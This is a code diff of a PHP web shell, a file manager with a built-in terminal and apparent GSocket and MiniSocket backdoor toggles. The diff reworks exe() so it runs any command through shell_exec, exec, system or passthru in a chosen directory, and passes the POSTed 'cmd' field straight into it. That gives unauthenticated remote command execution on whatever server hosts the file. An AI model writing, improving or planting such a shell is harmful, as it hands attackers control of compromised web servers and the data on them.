@@ -16,13 +16,56 @@ function owner($file){
     }
     return 'unknown';
 }
-function exe($cmd){
-    if(function_exists('shell_exec')) return shell_exec($cmd);
-    elseif(function_exists('exec')){exec($cmd,$o);return implode("\n",$o);}
-    elseif(function_exists('system')){ob_start();system($cmd);$o=ob_get_clean();return $o;}
-    elseif(function_exists('passthru')){ob_start();passthru($cmd);$o=ob_get_clean();return $o;}
+// function exe($cmd){
+//     if(function_exists('shell_exec')) return shell_exec($cmd);
+//     elseif(function_exists('exec')){exec($cmd,$o);return implode("\n",$o);}
+//     elseif(function_exists('system')){ob_start();system($cmd);$o=ob_get_clean();return $o;}
+//     elseif(function_exists('passthru')){ob_start();passthru($cmd);$o=ob_get_clean();return $o;}
+//     return "Command execution not available.";
+// }
+function exe($cmd, $cwd = null){
+    $cmd = "(" . $cmd . ") 2>&1";
+    
+    if($cwd) {
+        $cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
+    }
+    
+    if(function_exists("shell_exec")) {
+        $result = shell_exec($cmd);
+        if($result === null || $result === false) {
+            return "Command executed (no output)";
+        }
+        return $result;
+    }
+    elseif(function_exists("exec")){
+        exec($cmd, $o, $return_var);
+        $output = implode("\n", $o);
+        if($return_var !== 0 && empty($output)) {
+            return "Command failed with return code: " . $return_var;
+        }
+        return $output ?: "Command executed (no output)";
+    }
+    elseif(function_exists("system")){
+        ob_start();
+        system($cmd, $return_var);
+        $o = ob_get_clean();
+        if($return_var !== 0 && empty($o)) {
+            return "Command failed with return code: " . $return_var;
+        }
+        return $o ?: "Command executed (no output)";
+    }
+    elseif(function_exists("passthru")){
+        ob_start();
+        passthru($cmd, $return_var);
+        $o = ob_get_clean();
+        if($return_var !== 0 && empty($o)) {
+            return "Command failed with return code: " . $return_var;
+        }
+        return $o ?: "Command executed (no output)";
+    }
     return "Command execution not available.";
 }
+
 function getFileDate($file, $format = 'F d Y H:i:s') { return date($format, filemtime($file)); }
 function formatSize($bytes){
     if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
@@ -172,8 +215,8 @@ $showTerminal = isset($_POST['toggle_terminal']) ? true : false;
 $showGSocket = isset($_POST['show_gsocket']) ? true : false;
 $showMiniSocket = isset($_POST['show_minisocket']) ? true : false;
 
-if(isset($_POST['execmd'])){ 
-    $terminal_output = exe($_POST['cmd']); 
+if(isset($_POST["execmd"])){ 
+    $terminal_output = exe($_POST["cmd"], $path); 
     $showTerminal = true;
 }
 
